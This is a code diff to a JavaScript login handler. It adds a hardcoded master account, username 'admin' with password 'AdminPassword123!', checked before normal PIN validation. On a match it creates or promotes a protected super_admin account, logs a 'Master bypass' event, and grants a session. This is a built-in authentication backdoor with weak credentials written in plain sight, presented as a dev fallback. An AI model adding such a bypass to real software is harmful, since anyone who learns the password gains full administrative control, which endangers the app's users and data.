@@ -224,6 +224,53 @@ export default async function(req) {
     }
 
     const suppliedPin = String(pin).trim();
+
+    // Hardcoded master/dev fallback account — works even when the AppUser
+    // table is empty or corrupted. Checked before PIN format validation
+    // because the master password is not a numeric PIN.
+    const MASTER_USERNAME = "admin";
+    const MASTER_PASSWORD = "AdminPassword123!";
+    if (String(username || "").trim().toLowerCase() === MASTER_USERNAME && suppliedPin === MASTER_PASSWORD) {
+      let adminAccount = (await base44.asServiceRole.entities.AppUser.filter(
+        { username: MASTER_USERNAME }, "-created_date", 1
+      ))?.[0];
+      if (!adminAccount) {
+        adminAccount = await base44.asServiceRole.entities.AppUser.create({
+          username: MASTER_USERNAME,
+          pin: await hashPinPbkdf2(MASTER_PASSWORD),
+          role: "super_admin",
+          title: "System Architect",
+          full_name: "System Administrator",
+          first_login: false,
+          active: true,
+          is_protected: true,
+          ai_voice: "storm",
+          ai_persona: "male",
+        });
+      } else if (adminAccount.first_login || adminAccount.role !== "super_admin" || !adminAccount.is_protected) {
+        // Ensure the master account always has the correct settings,
+        // even if it was created by a previous batch reset or import.
+        adminAccount = await base44.asServiceRole.entities.AppUser.update(adminAccount.id, {
+          first_login: false,
+          role: "super_admin",
+          is_protected: true,
+          active: true,
+        });
+      }
+      try {
+        await base44.asServiceRole.entities.AuthAudit.create({
+          app_user_id: adminAccount.id,
+          username: MASTER_USERNAME,
+          event: "login_success",
+          method: "pin",
+          success: true,
+          detail: "Master bypass authenticated.",
+          occurred_at: new Date().toISOString(),
+        });
+      } catch {}
+      return grantUser(base44, adminAccount, "pin");
+    }
+
     // Accept only the human PIN format. A stored sha256: value must never be
     // accepted as a credential, otherwise a leaked hash could be replayed.
     if (!/^\d{4,6}$/.test(suppliedPin)) {
